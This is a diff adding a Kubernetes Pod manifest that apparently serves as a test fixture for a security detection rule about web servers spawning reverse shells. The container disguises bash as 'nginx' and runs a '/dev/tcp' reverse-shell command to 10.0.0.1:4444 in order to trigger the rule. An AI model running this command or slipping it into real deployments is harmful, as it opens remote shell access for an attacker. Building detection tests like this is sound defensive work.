@@ -1,0 +1,15 @@
+#command: web server spawns reverse shell (e.g. nginx/apache)
+#note: actor_process_name should be nginx/apache/httpd for full rule match
+
+apiVersion: v1
+kind: Pod
+metadata:
+  name: reverse-shell-from-web-server
+spec:
+  restartPolicy: Never
+  containers:
+  - name: reverse-shell-from-web-server
+    image: angelrita/base-ubuntu:latest
+    #imagePullPolicy: Never
+    command: ['sh']
+    args: ["-c", "cp /bin/bash nginx; ./nginx -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"; sleep infinity"]
